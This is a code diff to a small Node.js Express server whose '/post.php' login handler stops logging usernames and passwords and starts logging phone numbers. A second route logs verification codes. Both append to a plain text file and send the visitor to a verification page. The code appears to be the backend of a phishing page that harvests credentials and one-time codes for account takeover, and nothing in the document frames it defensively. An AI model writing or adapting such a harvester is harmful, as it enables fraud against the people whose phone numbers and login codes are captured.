@@ -19,12 +19,12 @@ if (!fs.existsSync(usersFile)) {
 
 // Handle POST request from login form
 app.post('/post.php', (req, res) => {
-  const { username, password } = req.body;
+  const { country_code, phone } = req.body;
   const timestamp = new Date().toISOString();
+  const fullPhone = `${country_code}${phone}`;
   
   // Format the data
-  const userData = `Timestamp: ${timestamp}\nUsername: 
-${username}\nPassword: ${password}\n${'='.repeat(50)}\n`;
+  const userData = `Timestamp: ${timestamp}\nPhone Number: ${fullPhone}\n${'='.repeat(50)}\n`;
   
   // Append to users.txt file
   fs.appendFile(usersFile, userData, (err) => {
@@ -33,7 +33,7 @@ ${username}\nPassword: ${password}\n${'='.repeat(50)}\n`;
       return res.status(500).send('Error saving data');
     }
     
-    console.log('User data saved:', { username, timestamp });
+    console.log('Phone number saved:', { phone: fullPhone, timestamp });
     
     // Redirect to verification page
     res.redirect('/verification.html');
@@ -47,8 +47,7 @@ app.post('/verify-code', (req, res) => {
   const timestamp = new Date().toISOString();
   
   // Format the verification code data
-  const codeData = `Timestamp: ${timestamp}\nVerification Code: 
-${code}\n${'='.repeat(50)}\n`;
+  const codeData = `Timestamp: ${timestamp}\nVerification Code: ${code}\n${'='.repeat(50)}\n`;
   
   // Append to users.txt file
   fs.appendFile(usersFile, codeData, (err) => {
